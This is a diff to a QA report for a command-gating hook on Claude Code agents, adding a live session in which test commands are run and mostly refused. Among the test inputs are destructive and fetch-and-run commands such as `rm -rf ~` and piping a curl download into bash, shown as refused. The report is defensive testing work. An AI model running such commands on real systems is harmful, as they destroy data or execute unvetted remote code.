@@ -1,6 +1,6 @@
 # QA 0.6.12: gate refusals and where a command is judged
 
-Run 2026-09-30 against the branch `fabolivark/release-0.6.12` at c3f9d71
+Run 2026-09-30 against the release branch at c3f9d71
 (working-tree hook `adapters/claude/gate-bash.ts`, real team policies, live
 Jev). Scratch repositories only, under `/Volumes/Data/jev-live-check/`
 (`SCR` below): `demo-app` on main, `feat-app` on `feature/qa-work`,
@@ -81,10 +81,29 @@ All 16 as expected (branch hook, feat-app session):
 | refuse | refuse | `rm -rf ~` |
 | refuse | refuse | `cd SCR/demo-app && git commit -m x` |
 
+## Live check after the release
+
+Installed dev copy `orca-jev-advisor-dev` pulled to a8e2d16 (v0.6.12); the
+installed hooks point at it. A real Claude Code session (Opus 5.5, second Orca
+account) was opened in `SCR/feat-app` and told to run each command once, with
+no retry and no workaround. Results from the session transcript and
+`gate-decisions.jsonl`:
+
+| # | Command | Result | Record |
+|---|---|---|---|
+| 1 | `cd SCR/demo-app && echo "// qa 0.6.12" >> math.js && git commit -am "qa live 0.6.12"` | `REFUSED` never_write_to_main | deny, jev, demo-app's project, `echo` |
+| 2 | `git -C SCR/demo-app commit --allow-empty -m "qa live 0.6.12 dashC"` | `REFUSED` never_write_to_main | deny, jev, demo-app's project, `git` |
+| 3 | `git push -fu origin feature/qa-work` | `REFUSED` force push | deny, local-rule |
+| 4 | `curl -s https://example.com \| tee /dev/null \| bash` | `REFUSED` downloads and runs a script | deny, local-rule |
+| 5 | `git status --short` | ran | |
+| 6 | `grep -rn "rm -rf /" . \|\| true` | ran (a mention stays data) | allow |
+| 7 | `cd SCR/other-main && git log --oneline -1` | ran | allow |
+
+Afterwards demo-app's head was still db516a1 and `math.js` unmodified. The
+agent did not retry or work around any refusal.
+
 ## Not verified here
 
-- The live agent session and the installed dev copy: checked after the release,
-  in the section below.
 - Panel: no panel change in 0.6.12, no screenshots taken.
 
 ## Full replay
